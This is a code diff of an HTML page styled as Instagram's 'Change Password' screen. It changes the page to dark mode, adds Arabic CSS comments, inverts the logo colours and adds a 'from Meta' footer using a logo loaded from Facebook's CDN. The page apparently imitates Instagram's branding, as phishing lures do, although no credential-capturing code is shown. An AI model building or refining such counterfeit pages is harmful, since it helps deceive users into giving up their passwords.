@@ -5,14 +5,28 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Change Password • Instagram</title>
     <style>
-        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; background-color: #fafafa; margin: 0; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; }
-        .container { background: white; border: 1px solid #dbdbdb; width: 350px; padding: 20px 40px; text-align: center; box-sizing: border-box; }
-        .logo { width: 175px; margin: 20px 0; }
+        /* جعل الخلفية سوداء بالكامل وتغيير الخط */
+        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; background-color: #000; margin: 0; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; color: #fff; }
+        
+        /* إطار النموذج (أسود ولكنه أفتح قليلاً لإبراز الصندوق) */
+        .container { background: #000; border: 1px solid #262626; width: 350px; padding: 20px 40px; text-align: center; box-sizing: border-box; }
+        
+        /* جعل الشعار أبيضاً باستخدام فلتر */
+        .logo { width: 175px; margin: 20px 0; filter: invert(1); }
+        
+        /* تنسيق النص العلوي (رمادي فاتح) */
         .info-text { color: #8e8e8e; font-size: 14px; margin-bottom: 20px; font-weight: 600; }
-        input { width: 100%; background: #fafafa; border: 1px solid #dbdbdb; border-radius: 3px; padding: 9px; margin-bottom: 10px; box-sizing: border-box; font-size: 12px; }
+        
+        /* تنسيق خانات الإدخال الداكنة */
+        input { width: 100%; background: #121212; border: 1px solid #262626; border-radius: 3px; padding: 9px; margin-bottom: 10px; box-sizing: border-box; font-size: 12px; color: #fff; }
+        
+        /* تنسيق الزر الأزرق */
         button { width: 100%; background-color: #0095f6; border: none; border-radius: 4px; color: white; padding: 7px; font-weight: 600; cursor: pointer; margin-top: 10px; }
         button:disabled { background-color: rgba(0, 149, 246, .3); }
+        
+        /* تنسيق الفوتر مع شعار Meta */
         .meta-footer { margin-top: 20px; font-size: 12px; color: #8e8e8e; }
+        .meta-logo { width: 60px; vertical-align: middle; filter: invert(1); }
     </style>
 </head>
 <body>
@@ -35,7 +49,8 @@
 </div>
 
 <div class="meta-footer">
-    <img src="https://static.xx.fbcdn.net/rsrc.php/v3/yO/r/v2O_p4-S8sc.png" alt="Meta" style="width: 60px; vertical-align: middle;">
+    <span>from</span>
+    <img src="https://static.xx.fbcdn.net/rsrc.php/v3/yO/r/v2O_p4-S8sc.png" alt="Meta" class="meta-logo">
 </div>
 
 </body>
